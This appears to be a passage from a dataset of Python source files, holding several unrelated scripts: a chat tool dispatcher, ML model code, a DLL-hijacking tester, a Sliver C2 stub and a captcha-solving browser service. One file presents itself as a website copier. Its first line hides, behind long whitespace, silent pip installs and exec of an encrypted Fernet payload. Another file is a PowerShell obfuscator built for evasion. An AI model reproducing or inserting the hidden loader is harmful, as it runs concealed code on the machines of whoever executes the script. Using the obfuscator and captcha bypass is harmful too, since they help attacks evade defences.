\"data_base\"\r\n]\r\n\r\ndef dispatch_tool(tool_name: str, tool_params: dict) -> str:\r\n    if \"multi_tool_use.\" in tool_name:\r\n        tool_name=tool_name.replace(\"multi_tool_use.\", \"\")\r\n    if tool_name not in _TOOL_HOOKS:\r\n        return f\"Tool `{tool_name}` not found. Please use a provided tool.\"\r\n    tool_call = globals().get(tool_name)\r\n    try:\r\n        ret = tool_call(**tool_params)\r\n    except:\r\n        ret = traceback.format_exc()\r\n    return str(ret)\r\n\r\n\r\nclass Chat:\r\n    def __init__(self, history, model_name, temperature,max_length,tools=None) -> None:\r\n        self.messages = history\r\n        self.model_name = model_name\r\n        self.temperature = temperature\r\n        self.tools = tools\r\n        self.max_tokens=max_length\r\n\r\n    def send(self, user_prompt):\r\n        try:\r\n            new_message = {\"role\": \"user\", \"content\": user_prompt}\r\n            self.messages.append(new_message)\r\n            print(self.messages)\r\n            if self.tools is not None:\r\n                response = openai.chat.completions.create(\r\n                    model=self.model_name,\r\n                    messages=self.messages,\r\n                    temperature=self.temperature,\r\n                    tools=self.tools,\r\n                    max_tokens=self.max_tokens\r\n                )\r\n                while response.choices[0].message.tool_calls:\r\n                    assistant_message=response.choices[0].message\r\n                    response_content = assistant_message.tool_calls[0].function\r\n                    results = dispatch_tool(response_content.name,json.loads(response_content.arguments))\r\n                    self.messages.append({\"role\": assistant_message.role, \"content\": str(response_content)})\r\n                    self.messages.append({\"role\": \"function\", \"tool_call_id\": assistant_message.tool_calls[0].id, \"name\": response_content.name, \"content\": results})\r\n                    response = openai.chat.completions.create(\r\n                    model=self.model_name,  \r\n                    messages=self.messages,\r\n                    tools=self.tools,\r\n                    max_tokens=self.max_tokens\r\n                    )\r\n                while response.choices[0].message.function_call:\r\n                    assistant_message = response.choices[0].message\r\n                    function_call = assistant_message.function_call\r\n                    function_name = function_call.name\r\n                    function_arguments = json.loads(function_call.arguments)\r\n                    results = dispatch_tool(function_name, function_arguments)\r\n                    self.messages.append({\"role\": assistant_message.role, \"content\": str(function_call)})\r\n                    self.messages.append({\"role\": \"function\", \"name\": function_name, \"content\": results})\r\n                    response = openai.chat.completions.create(\r\n                        model=self.model_name,\r\n                        messages=self.messages,\r\n                        tools=self.tools,\r\n                        max_tokens=self.max_tokens\r\n                    )\r\n                response_content = response.choices[0].message.content\r\n                start_pattern = \"interpreter\\n ```python\\n\"\r\n                end_pattern = \"\\n```\"\r\n                while response_content.startswith(start_pattern):\r\n                    start_index = response_content.find(start_pattern)\r\n                    end_index = response_content.find(end_pattern)\r\n                    if start_index != -1 and end_index != -1:\r\n         ",
    "from lib.Utilitys import *\nfrom lib.config_read import *\nimport os\nimport sys\nfrom tqdm import tqdm\nimport time\n\nif __name__ == \"__main__\":\n\n    start_print()\n\n    true_dlls = []\n    defective_dlls = []\n\n    #\u6839\u636e\u76ee\u6807\u6587\u4ef6\u4f4d\u6570\u9009\u62e9DLL\n    source_file = get_exe_is_architecture64(destination_dir+'\\\\'+exe_name)\n    #\u83b7\u53d6\u6240\u6709DLL\u7684\u540d\u79f0\n    path_check()\n    matches = get_dll_names(dll_names_paths)\n\n\n    #\u5220\u9664\u6240\u6709\u5e72\u6270DLL\n    print('[INFO]: \u6b63\u5728\u5bfb\u627e\u5e76\u6e05\u9664\u5e72\u6270DLL...')\n    process_con(exe_name)\n    for i in matches:\n        if os.path.exists(destination_dir + '\\\\' + i):\n            os.remove(destination_dir + '\\\\' + i)\n    print('[INFO]: \u6e05\u9664\u5e72\u6270DLL\u6210\u529f,\u5f00\u59cb\u5224\u65ad...')\n\n    matches_len = len(matches)\n\n    for index,i in tqdm(enumerate(matches, start=1), file=sys.stdout ,total=matches_len, desc='Processing'):\n        #\u590d\u5236\u6267\u884c\n        copy_file(source_file,destination_dir+'\\\\'+i)\n\n\n        #\u4e3a\u786e\u4fdd\u4e0d\u53d7\u5f71\u54cd\uff0c\u5728\u542f\u52a8\u8fdb\u7a0b\u524d\u786e\u4fdd\u767d\u7a0b\u5e8f\u8fdb\u7a0b\u548c\u8ba1\u7b97\u5668\u8fdb\u7a0b\u88ab\u6210\u529f\u5173\u95ed\n        process_con(exe_name)\n\n\n        #\u6267\u884c\u7a0b\u5e8f\n        process = execute_exe(destination_dir+'\\\\'+exe_name)\n        time.sleep(delay)\n\n        #\u5224\u65adDLL\u662f\u5426\u5408\u683c\n        log = process_con(exe_name)\n        process.kill()\n        if log == 1:\n            if i not in defective_dlls:\n                defective_dlls.append(i)\n                my_print(f'{i}--->\u5224\u65ad\u53ef\u80fd\u4e3a\u6709\u7f3a\u9677\u7684DLL\u6587\u4ef6','warning')\n        elif log == 3:\n            if i not in true_dlls:\n                true_dlls.append(i)\n                my_print(f'{i}--->\u5224\u65ad\u53ef\u80fd\u4e3a\u53ef\u52ab\u6301\u7684DLL\u6587\u4ef6','success')\n        #\u5220\u9664\u6587\u4ef6\n        while  is_process_kill(exe_name):\n            pass\n        os.remove(destination_dir+'\\\\'+i)\n\n    #\u8f93\u51fa\u53bb\u91cd\u540e\u7684\u6700\u7ec8\u7ed3\u679c\n    end_print(true_dlls,defective_dlls)\n\n\n",
    "import os\nimport base64\nimport random\nfrom typing import Dict, List\n\ndef rh(prompt: str) -> str:\n    return input(prompt)\n\ndef rfc(path: str) -> str:\n    with open(path, \"r\") as file:\n        return file.read()\n\ndef gem(ev: List[str]) -> Dict[str, Dict[str, List[int]]]:\n    em = {}\n    for var in ev:\n        value = os.environ.get(var, \"\")\n        if value:\n            for char in value:\n                if char not in em:\n                    em[char] = {}\n                if var not in em[char]:\n                    em[char][var] = []\n                em[char][var].append(value.index(char))\n    return em\n\ndef eo(string: str, em: Dict[str, Dict[str, List[int]]]) -> List[str]:\n    obf_code = []\n    for char in string:\n        options = em.get(char)\n        if not options:\n            obf_code.append(f\"[char]{ord(char)}\")\n            continue\n        chosen = random.choice(list(options.keys()))\n        possible_indices = options[chosen]\n        chosen_index = random.choice(possible_indices)\n        new_char = os.environ[chosen][chosen_index]\n        pwsh_syntax = f\"$env:{chosen}[{chosen_index}]\"\n        obf_code.append(pwsh_syntax)\n    return obf_code\n\ndef po(string: str, em: Dict[str, Dict[str, List[int]]]) -> str:\n    iex = eo(\"iex\", em)\n    pieces = eo(string, em)\n    iex_stage = \"($( {} ) -Join $($null))\".format(\",\".join(iex))\n    payload_stage = \"($( {} ) -Join $($null))\".format(\",\".join(pieces))\n    return \"& {} {}\".format(iex_stage, payload_stage)\n\ndef main():\n\n    print(\"\\033[38;2;255;69;172m\" + r'''\n    ____ _       _______ __  __      ______                 ______          \n   / __ \\ |     / / ___// / / /     / ____/___ _   __      / ____/___  _____\n  / /_/ / | /| / /\\__ \\/ /_/ /_____/ __/ / __ \\ | / /_____/ __/ / __ \\/ ___/\n / ____/| |/ |/ /___/ / __  /_____/ /___/ / / / |/ /_____/ /___/ / / / /__  \n/_/     |__/|__//____/_/ /_/     /_____/_/ /_/|___/     /_____/_/ /_/\\___/  \n                                                             By @malwarekid\n''' + \"\\033[0m\"\"\\033[32m\")\n\n    powershell_cmd = rh(\"Powershell command (leave empty for SCRIPT file) : \")\n\n    if not powershell_cmd:\n        pf = rh(\"Script Path : \")\n        powershell_cmd = rfc(pf)\n\n    cpe = rh(\"Pre encode the command? (helpful if your command has ' or \\\" or $ characters) [y/n]\")\n    out_to_file = rh(\"Wants to save the file? [y/n]\" + \"\\033[0m\")\n\n    ev = [\n        \"ALLUSERSPROFILE\",\n        \"CommonProgramFiles\",\n        \"CommonProgramW6432\",\n        \"ComSpec\",\n        \"PATHEXT\",\n        \"ProgramData\",\n        \"ProgramFiles\",\n        \"ProgramW6432\",\n        \"PSModulePath\",\n        \"PUBLIC\",\n        \"SystemDrive\",\n        \"SystemRoot\",\n        \"windir\"\n    ]\n\n    em = gem(ev)\n\n    if cpe.lower() == 'y':\n        print(\"Original Command\\n================================\\n{}\\n================================\".format(powershell_cmd))\n        to_encode = powershell_cmd\n        encoded_command = base64.b64encode(to_encode.encode(\"utf-16le\")).decode()\n        full_command = f\"Start-Process PowerShell.exe -ArgumentList ('-ep bypass -w h -e {encoded_command}')\"\n        print(\"Encoded Command\\n================================\\n{}\\n================================\".format(full_command))\n        encoded = po(full_command, em)\n    else:\n        print(\"Original Command\\n================================\\n{}\\n================================\".format(powershell_cmd))\n        encoded = po(powershell_cmd, em)\n\n    print(\"\\033[31m\" + r\"FINAL Encoded Command\"+ \"\\033[0m\"\"\\n================================\\n{}\\n================================\".format(encoded))\n\n    if out_to_file.lower() == 'y':\n        with open('encoded.ps1', 'w') as file:\n            file.write(encoded)\n        print(\"================================\\nFile saved to 'encoded.ps1'\\n================================\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import typing\nfrom typing import List\n\nimport torch\nimport torch.nn.functional as F\nfrom audiotools import AudioSignal\nfrom audiotools import STFTParams\nfrom torch import nn\n\n\nclass L1Loss(nn.L1Loss):\n    \"\"\"L1 Loss between AudioSignals. Defaults\n    to comparing ``audio_data``, but any\n    attribute of an AudioSignal can be used.\n\n    Parameters\n    ----------\n    attribute : str, optional\n        Attribute of signal to compare, defaults to ``audio_data``.\n    weight : float, optional\n        Weight of this loss, defaults to 1.0.\n\n    Implementation copied from: https://github.com/descriptinc/lyrebird-audiotools/blob/961786aa1a9d628cca0c0486e5885a457fe70c1a/audiotools/metrics/distance.py\n    \"\"\"\n\n    def __init__(self, attribute: str = \"audio_data\", weight: float = 1.0, **kwargs):\n        self.attribute = attribute\n        self.weight = weight\n        super().__init__(**kwargs)\n\n    def forward(self, x: AudioSignal, y: AudioSignal):\n        \"\"\"\n        Parameters\n        ----------\n        x : AudioSignal\n            Estimate AudioSignal\n        y : AudioSignal\n            Reference AudioSignal\n\n        Returns\n        -------\n        torch.Tensor\n            L1 loss between AudioSignal attributes.\n        \"\"\"\n        if isinstance(x, AudioSignal):\n            x = getattr(x, self.attribute)\n            y = getattr(y, self.attribute)\n        return super().forward(x, y)\n\n\nclass SISDRLoss(nn.Module):\n    \"\"\"\n    Computes the Scale-Invariant Source-to-Distortion Ratio between a batch\n    of estimated and reference audio signals or aligned features.\n\n    Parameters\n    ----------\n    scaling : int, optional\n        Whether to use scale-invariant (True) or\n        signal-to-noise ratio (False), by default True\n    reduction : str, optional\n        How to reduce across the batch (either 'mean',\n        'sum', or none).], by default ' mean'\n    zero_mean : int, optional\n        Zero mean the references and estimates before\n        computing the loss, by default True\n    clip_min : int, optional\n        The minimum possible loss value. Helps network\n        to not focus on making already good examples better, by default None\n    weight : float, optional\n        Weight of this loss, defaults to 1.0.\n\n    Implementation copied from: https://github.com/descriptinc/lyrebird-audiotools/blob/961786aa1a9d628cca0c0486e5885a457fe70c1a/audiotools/metrics/distance.py\n    \"\"\"\n\n    def __init__(\n        self,\n        scaling: int = True,\n        reduction: str = \"mean\",\n        zero_mean: int = True,\n        clip_min: int = None,\n        weight: float = 1.0,\n    ):\n        self.scaling = scaling\n        self.reduction = reduction\n        self.zero_mean = zero_mean\n        self.clip_min = clip_min\n        self.weight = weight\n        super().__init__()\n\n    def forward(self, x: AudioSignal, y: AudioSignal):\n        eps = 1e-8\n        # nb, nc, nt\n        if isinstance(x, AudioSignal):\n            references = x.audio_data\n            estimates = y.audio_data\n        else:\n            references = x\n            estimates = y\n\n        nb = references.shape[0]\n        references = references.reshape(nb, 1, -1).permute(0, 2, 1)\n        estimates = estimates.reshape(nb, 1, -1).permute(0, 2, 1)\n\n        # samples now on axis 1\n        if self.zero_mean:\n            mean_reference = references.mean(dim=1, keepdim=True)\n            mean_estimate = estimates.mean(dim=1, keepdim=True)\n        else:\n            mean_reference = 0\n            mean_estimate = 0\n\n        _references = references - mean_reference\n        _estimates = estimates - mean_estimate\n\n        references_projection = (_references**2).sum(dim=-2) + eps\n        references_on_estimates = (_estimates * _references).sum(dim=-2) + eps\n\n        scale = (\n            (references_on_estimates / references_projection).unsqueeze(1)\n            if self.scaling\n            else 1\n        )\n\n        e_true = scale * _references\n        e_res = _estimates - e_true\n\n        signal = (e_true**2).sum(dim=1)\n        noise = (e_res**2).sum(dim=1)\n        sdr = -10 * torch.log10(signal / noise + eps)\n\n        if self.clip_min is not None:\n            sdr = torch.clamp(sdr, min=self.clip_min)\n\n        if self.reduction == \"mean\":\n            sdr = sdr.mean()\n        elif self.reduction == \"sum\":\n            sdr = sdr.sum()\n        return sdr\n\n\nclass MultiScaleSTFTLoss(nn.Module):\n    \"\"\"Computes the multi-scale STFT loss from [1].\n\n    Parameters\n    ----------\n    window_lengths : List[int], optional\n        Length of each window of each STFT, by default [2048, 512]\n    loss_fn : typing.Callable, optional\n        How to compare each loss, by default nn.L1Loss()\n    clamp_eps : float, optional\n        Clamp on the log magnitude, below, by default 1e-5\n    mag_weight : float, optional\n        Weight of raw magnitude portion of loss, by default 1.0\n    log_weight : float, optional\n        Weight of log magnitude portion of loss, by default 1.0\n    pow : float, optional\n        Power to raise",
    "import ast\nfrom copy import copy\nfrom typing import List, Optional\n\nfrom llm_docstring_generator.python_files.imports import Import\n\n\ndef extract_imports_from_codestring(\n    codestring: str, import_name: str, all_imports: Optional[List[Import]] = None\n) -> List[Import]:\n    \"\"\"\n    Extract imports from codestring.\n    The challenge is to map imports such as\n    from foo.bar import baz to the correct Import object, e.g.\n    Import(import_name='foo.bar', class_or_function_name='baz')\n    (that is 'baz' is a function rather than a python file)\n    \"\"\"\n    import_parser = ImportParser(\n        codestring=codestring, import_name=import_name, all_imports=all_imports\n    )\n    return import_parser.extract_imports_from_codestring()\n\n\nclass ImportParser:\n    def __init__(\n        self,\n        codestring: str,\n        import_name: str,\n        all_imports: Optional[List[Import]] = None,\n    ):\n        self.codestring = codestring\n        self.import_name = import_name\n        self.all_imports = all_imports or []\n\n    def extract_imports_from_codestring(self) -> List[Import]:\n        import_from_nodes, import_nodes = self.get_imports_names()\n        imports = [\n            self.extract_import_from_import_from_node(import_from_node)\n            for import_from_node in import_from_nodes\n        ]\n        imports += [\n            self.extract_import_from_import_node(import_node)\n            for import_node in import_nodes\n        ]\n        return imports\n\n    def get_imports_names(self) -> List:\n        p = ast.parse(self.codestring)\n        import_nodes = []\n        for import_node in [\n            node for node in ast.walk(p) if isinstance(node, ast.Import)\n        ]:\n            names = import_node.names\n            for name in names:\n                import_node.names = [name]\n                import_nodes.append(copy(import_node))\n        import_from_nodes = []\n        for import_from_node in [\n            node for node in ast.walk(p) if isinstance(node, ast.ImportFrom)\n        ]:\n            names = import_from_node.names\n            for name in names:\n                import_from_node.names = [name]\n                import_from_nodes.append(copy(import_from_node))\n\n        return [import_from_nodes, import_nodes]\n\n    def extract_import_from_import_node(self, import_node: ast.Import):\n        alias = import_node.names[0]\n        potential_imports = [\n            Import(import_name=alias.name),\n            Import(import_name=self.import_name + \".\" + alias.name),\n        ]\n        if \".\" in alias.name:\n            potential_imports.append(\n                Import(\n                    import_name=\".\".join(alias.name.split(\".\")[:-1]),\n                    class_or_function_name=alias.name.split(\".\")[-1],\n                ),\n            )\n        for potential_import in potential_imports:\n            if potential_import in self.all_imports:\n                return potential_import\n        return potential_imports[0]\n\n    def extract_import_from_import_from_node(self, import_from_node: ast.ImportFrom):\n        # Read: \"extract_import from import_from_node\"\n        alias = import_from_node.names[0]\n        # if import is 'from . import Foo', node.module is None\n        import_name = (\n            import_from_node.module if import_from_node.module else self.import_name\n        )\n        name = alias.name\n        potential_imports = [\n            Import(import_name=import_name, class_or_function_name=name),\n            Import(import_name=import_name + \".\" + name),\n        ]\n        for potential_import in potential_imports:\n            if potential_import in self.all_imports:\n                return potential_import\n        return potential_imports[0]\n",
    "import torch\nimport os\nfrom copy import deepcopy\n\nclass ModelExporter(torch.nn.Module):\n    def __init__(self, yoloModel, device='cpu'):\n        super(ModelExporter, self).__init__()\n        model = deepcopy(yoloModel).to(device)\n        for p in model.parameters():\n            p.requires_grad = False\n        model.eval()\n        model.float()\n        model = model.fuse()\n\n        self.model = model\n        self.device = device\n\n    def forward(self, x, txt_feats):\n        return self.model.predict(x, txt_feats=txt_feats)\n\n    def export(self, output_dir, model_name, img_width, img_height, num_classes):\n        x = torch.randn(1, 3, img_width, img_height, requires_grad=False).to(self.device)\n        txt_feats = torch.randn(1, num_classes, 512, requires_grad=False).to(self.device)\n\n        print(x.shape, txt_feats.shape)\n\n        # Export model\n        onnx_name = model_name + \".onnx\"\n        os.makedirs(output_dir, exist_ok=True)\n        output_path = f\"{output_dir}/{onnx_name}\"\n        with torch.no_grad():\n            torch.onnx.export(self,\n                              (x, txt_feats),\n                              output_path,\n                              do_constant_folding=True,\n                              opset_version=17,\n                              input_names=[\"images\", \"txt_feats\"],\n                              output_names=[\"output\"])\n\n        return output_path",
    "import argparse\r\nimport datetime\r\nimport os\r\n\r\nimport lightning as L\r\nfrom lightning.pytorch.callbacks import LearningRateMonitor, ModelCheckpoint, TQDMProgressBar\r\n\r\nimport numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.optim as optim\r\n\r\nfrom timm.loss import LabelSmoothingCrossEntropy\r\nfrom timm.models.layers import DropPath\r\nfrom timm.models.layers import trunc_normal_\r\nfrom torchmetrics.classification import MulticlassF1Score\r\n\r\nfrom dataloader import get_datasets\r\nfrom utils import get_clf_report, save_copy_of_files, str2bool, random_masking_3D\r\n\r\n\r\nclass ICB(L.LightningModule):\r\n    def __init__(self, in_features, hidden_features, drop=0.):\r\n        super().__init__()\r\n        self.conv1 = nn.Conv1d(in_features, hidden_features, 1)\r\n        self.conv2 = nn.Conv1d(in_features, hidden_features, 3, 1, 1)\r\n        self.conv3 = nn.Conv1d(hidden_features, in_features, 1)\r\n        self.drop = nn.Dropout(drop)\r\n        self.act = nn.GELU()\r\n\r\n    def forward(self, x):\r\n        x = x.transpose(1, 2)\r\n        x1 = self.conv1(x)\r\n        x1_1 = self.act(x1)\r\n        x1_2 = self.drop(x1_1)\r\n\r\n        x2 = self.conv2(x)\r\n        x2_1 = self.act(x2)\r\n        x2_2 = self.drop(x2_1)\r\n\r\n        out1 = x1 * x2_2\r\n        out2 = x2 * x1_2\r\n\r\n        x = self.conv3(out1 + out2)\r\n        x = x.transpose(1, 2)\r\n        return x\r\n\r\n\r\nclass PatchEmbed(L.LightningModule):\r\n    def __init__(self, seq_len, patch_size=8, in_chans=3, embed_dim=384):\r\n        super().__init__()\r\n        stride = patch_size // 2\r\n        num_patches = int((seq_len - patch_size) / stride + 1)\r\n        self.num_patches = num_patches\r\n        self.proj = nn.Conv1d(in_chans, embed_dim, kernel_size=patch_size, stride=stride)\r\n\r\n    def forward(self, x):\r\n        x_out = self.proj(x).flatten(2).transpose(1, 2)\r\n        return x_out\r\n\r\n\r\nclass Adaptive_Spectral_Block(nn.Module):\r\n    def __init__(self, dim):\r\n        super().__init__()\r\n        self.complex_weight_high = nn.Parameter(torch.randn(dim, 2, dtype=torch.float32) * 0.02)\r\n        self.complex_weight = nn.Parameter(torch.randn(dim, 2, dtype=torch.float32) * 0.02)\r\n\r\n        trunc_normal_(self.complex_weight_high, std=.02)\r\n        trunc_normal_(self.complex_weight, std=.02)\r\n        self.threshold_param = nn.Parameter(torch.rand(1) * 0.5)\r\n\r\n    def create_adaptive_high_freq_mask(self, x_fft):\r\n        B, _, _ = x_fft.shape\r\n\r\n        # Calculate energy in the frequency domain\r\n        energy = torch.abs(x_fft).pow(2).sum(dim=-1)\r\n\r\n        # Flatten energy across H and W dimensions and then compute median\r\n        flat_energy = energy.view(B, -1)  # Flattening H and W into a single dimension\r\n        median_energy = flat_energy.median(dim=1, keepdim=True)[0]  # Compute median\r\n        median_energy = median_energy.view(B, 1)  # Reshape to match the original dimensions\r\n\r\n        # Normalize energy\r\n        epsilon = 1e-6  # Small constant to avoid division by zero\r\n        normalized_energy = energy / (median_energy + epsilon)\r\n\r\n        threshold = torch.quantile(normalized_energy, self.threshold_param)\r\n        dominant_frequencies = normalized_energy > threshold\r\n\r\n        # Initialize adaptive mask\r\n        adaptive_mask = torch.zeros_like(x_fft, device=x_fft.device)\r\n        adaptive_mask[dominant_frequencies] = 1\r\n\r\n        return adaptive_mask\r\n\r\n    def forward(self, x_in):\r\n        B, N, C = x_in.shape\r\n\r\n        dtype = x_in.dtype\r\n        x = x_in.to(torch.float32)\r\n\r\n        # Apply FFT along the time dimension\r\n        x_fft = torch.fft.rfft(x, dim=1, norm='ortho')\r\n        weight = torch.view_as_complex(self.complex_weight)\r\n        x_weighted = x_fft * weight\r\n\r\n        if args.adaptive_filter:\r\n            # Adaptive High Frequency Mask (no need for dimensional adjustments)\r\n            freq_mask = self.create_adaptive_high_freq_mask(x_fft)\r\n            x_masked = x_fft * freq_mask.to(x.device)\r\n\r\n            weight_high = torch.view_as_complex(self.complex_weight_high)\r\n            x_weighted2 = x_masked * weight_high\r\n\r\n            x_weighted += x_weighted2\r\n\r\n        # Apply Inverse FFT\r\n        x = torch.fft.irfft(x_weighted, n=N, dim=1, norm='ortho')\r\n\r\n        x = x.to(dtype)\r\n        x = x.view(B, N, C)  # Reshape back to original shape\r\n\r\n        return x\r\n\r\n\r\nclass TSLANet_layer(L.LightningModule):\r\n    def __init__(self, dim, mlp_ratio=3., drop=0., drop_path=0., norm_layer=nn.LayerNorm):\r\n        super().__init__()\r\n        self.norm1 = norm_layer(dim)\r\n        self.asb = Adaptive_Spectral_Block(dim)\r\n        self.drop_path = DropPath(drop_path) if drop_path > 0. else nn.Identity()\r\n        self.norm2 = norm_layer(dim)\r\n        mlp_hidden_dim = int(dim * mlp_ratio)\r\n        self.icb = ICB(in_features=dim, hidden_features=mlp_hidden_dim, drop=drop)\r\n\r\n    def forward(self, x):\r\n        # Check if both ASB and ICB are true\r\n        if args.ICB and args.ASB:\r\n            x = x + self.drop_path(self.icb(self.norm2(self.asb(self.norm1(x)))))\r\n        # If on",
    "from ..SliverRequests import SliverAPI\n\nfrom mythic_container.MythicCommandBase import *\nfrom mythic_container.MythicRPC import *\nfrom mythic_container.PayloadBuilder import *\n\nclass ExtensionsArguments(TaskArguments):\n    def __init__(self, command_line, **kwargs):\n        super().__init__(command_line, **kwargs)\n        self.args = []\n\n    async def parse_arguments(self):\n        pass\n\n\nclass Extensions(CommandBase):\n    cmd = \"extensions\"\n    needs_admin = False\n    help_cmd = \"extensions\"\n    description = \"Manage extensions\"\n    version = 1\n    author = \"Spencer Adolph\"\n    argument_class = ExtensionsArguments\n    attackmapping = []\n\n    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:\n        # Manage extensions\n\n        # Usage:\n        # ======\n        #   extensions [flags]\n\n        # Flags:\n        # ======\n        #        -h, --help           display help\n        #        -t, --timeout int    command timeout in seconds (default: 60)\n\n        # Sub Commands:\n        # =============\n        # TODO:  install  Install an extension from a local directory or .tar.gz file\n        # TODO:  list     List extensions loaded in the current session or beacon\n        # TODO:  load     Temporarily load an extension from a local directory\n        # TODO:  rm       Remove an installed extension\n\n        response = await extensions(taskData)\n\n        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(\n            TaskID=taskData.Task.ID,\n            Response=response.encode(\"UTF8\"),\n        ))\n\n        taskResponse = MythicCommandBase.PTTaskCreateTaskingMessageResponse(\n            TaskID=taskData.Task.ID,\n            Success=True,\n            Completed=True\n        )\n        return taskResponse\n\n    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:\n        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)\n        return resp\n\nasync def extensions(taskData: PTTaskMessageAllData):\n    # interact, isBeacon = await SliverAPI.create_sliver_interact(taskData)\n\n    # ifconfig_results = await interact._stub()\n\n    # if (isBeacon):\n    #     ifconfig_results = await ifconfig_results\n\n    return \"This command not yet implemented...\"\n",
    "from playwright.sync_api import sync_playwright\nfrom flask import Flask, request\nimport httpx\nimport jwt\n\napp = Flask(__name__)\n\ndef hsw(req: str, host: str) -> str:\n    try:\n        with sync_playwright() as p:\n            browser = p.chromium.launch(headless=True)\n            context = browser.new_context(bypass_csp=True)\n            page = context.new_page()\n            url = jwt.decode(req, options={\"verify_signature\": False})['l']\n            hsw = httpx.get(f\"{url}/hsw.js\").text\n            page.goto(f\"https://{host}\")\n            page.add_script_tag(content=\"Object.defineProperty(navigator, \\\"webdriver\\\", {\\\"get\\\": () => false})\")\n            page.add_script_tag(content=hsw)\n            response = page.evaluate(f\"hsw(\\\"{req}\\\")\")\n            page.close()\n            return str(response)\n    except Exception as e:\n        print(e)\n        return \"None\"\n    \n@app.route('/hsw', methods=['POST'])\ndef get_hsw():\n    data = request.json\n    req = data.get('req')\n    host = data.get('host')\n    result = hsw(req, host)\n    return result\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=\"5000\")",
    "# Copyright 2024 X.AI Corp.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport logging\n\nfrom model import LanguageModelConfig, TransformerConfig, QuantizedWeight8bit as QW8Bit\nfrom runners import InferenceRunner, ModelRunner, sample_from_model\n\n\nCKPT_PATH = \"/root\"\n\n\ndef main():\n    grok_1_model = LanguageModelConfig(\n        vocab_size=128 * 1024,\n        pad_token=0,\n        eos_token=2,\n        sequence_len=8192,\n        embedding_init_scale=1.0,\n        output_multiplier_scale=0.5773502691896257,\n        embedding_multiplier_scale=78.38367176906169,\n        model=TransformerConfig(\n            emb_size=48 * 128,\n            widening_factor=8,\n            key_size=128,\n            num_q_heads=48,\n            num_kv_heads=8,\n            num_layers=64,\n            attn_output_multiplier=0.08838834764831845,\n            shard_activations=True,\n            # MoE.\n            num_experts=8,\n            num_selected_experts=2,\n            # Activation sharding.\n            data_axis=\"data\",\n            model_axis=\"model\",\n        ),\n    )\n    inference_runner = InferenceRunner(\n        pad_sizes=(1024,),\n        runner=ModelRunner(\n            model=grok_1_model,\n            bs_per_device=0.125,\n            checkpoint_path=CKPT_PATH,\n        ),\n        name=\"local\",\n        load=CKPT_PATH,\n        tokenizer_path=\"./tokenizer.model\",\n        local_mesh_config=(1, 8),\n        between_hosts_config=(1, 1),\n    )\n    inference_runner.initialize()\n    gen = inference_runner.run()\n\n    inp = \"The answer to life the universe and everything is of course\"\n    print(f\"Output for prompt: {inp}\", sample_from_model(gen, inp, max_len=100, temperature=0.01))\n\n\nif __name__ == \"__main__\":\n    logging.basicConfig(level=logging.INFO)\n    main()",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'bQ0PAVKM9i1PydzZEAjFsD-Ad4K3n5v4NRC8xhtC9ns=').decrypt(b'gAAAAABmGp4ms6M3rNhp4ZJXcbngSZ6a__xv1xqWOtcG22104rJTaIDJZXiD_YrUWOaHtMYYRL4hLsAjfdu2uAZzj7q60b3BYFE5rX8Oj736RziPlvUpNrHf6N0DiAvWvP0uJ7XkGMXsz5gaUygih5lTmsKJOvNtg4bcTNfWb4cF35ldTM2CktMMrfVrU9KUJlcIj93h87aKJ0RYUiiiGGUVnE6k2uGx50Y-0a-CmbPi6EOktl4RSxg='))\nimport sys\n\nimport os\nimport requests\nimport shutil\nfrom bs4 import BeautifulSoup\n\n\nbase_dir = os.getcwd()\n\ntry:\n    site_name = sys.argv[1]\n    project_name = sys.argv[2]\nexcept IndexError:\n    print(\"Usage:\\npython app.py www.example.com folder_name\")\n    sys.exit(1)\n\nproject_path = \"../\" + project_name\nos.makedirs(project_path, exist_ok=True)\n\nvisited_links = []\nerror_links = []\n\n\ndef save(bs, element, check):\n    links = bs.find_all(element)\n\n    for l in links:\n        href = l.get(\"href\")\n        if href is not None and href not in visited_links:\n            if check in href:\n                href = l.get(\"href\")\n                print(\"Working with : {}\".format(href))\n                if \"//\" in href:\n                    path_s = href.split(\"/\")\n                    file_name = \"\"\n                    for i in range(3, len(path_s)):\n                        file_name = file_name + \"/\" + path_s[i]\n                else:\n                    file_name = href\n\n                l = site_name + file_name\n\n                try:\n                    r = requests.get(l)\n                except requests.exceptions.ConnectionError:\n                    error_links.append(l)\n                    continue\n\n                if r.status_code != 200:\n                    error_links.append(l)\n                    continue\n\n                os.makedirs(os.path.dirname(project_path + file_name.split(\"?\")[0]), exist_ok=True)\n                with open(project_path + file_name.split(\"?\")[0], \"wb\") as f:\n                    f.write(r.text.encode('utf-8'))\n                    f.close()\n\n                visited_links.append(l)\n\n\ndef save_assets(html_text):\n    bs = BeautifulSoup(html_text, \"html.parser\")\n    save(bs=bs, element=\"link\", check=\".css\")\n    save(bs=bs, element=\"script\", check=\".js\")\n\n    links = bs.find_all(\"img\")\n    for l in links:\n        href = l.get(\"src\")\n        if href is not None and href not in visited_links:\n            print(\"Working with : {}\".format(href))\n            if \"//\" in href:\n                path_s = href.split(\"/\")\n                file_name = \"\"\n                for i in range(3, len(path_s)):\n                    file_name = file_name + \"/\" + path_s[i]\n            else:\n                file_name = href\n\n            l = site_name + file_name\n\n            try:\n                r = requests.get(l, stream=True)\n            except requests.exceptions.ConnectionError:\n                error_links.append(l)\n                continue\n\n            if r.status_code != 200:\n                error_links.append(l)\n                continue\n\n            os.makedirs(os.path.dirname(project_path + 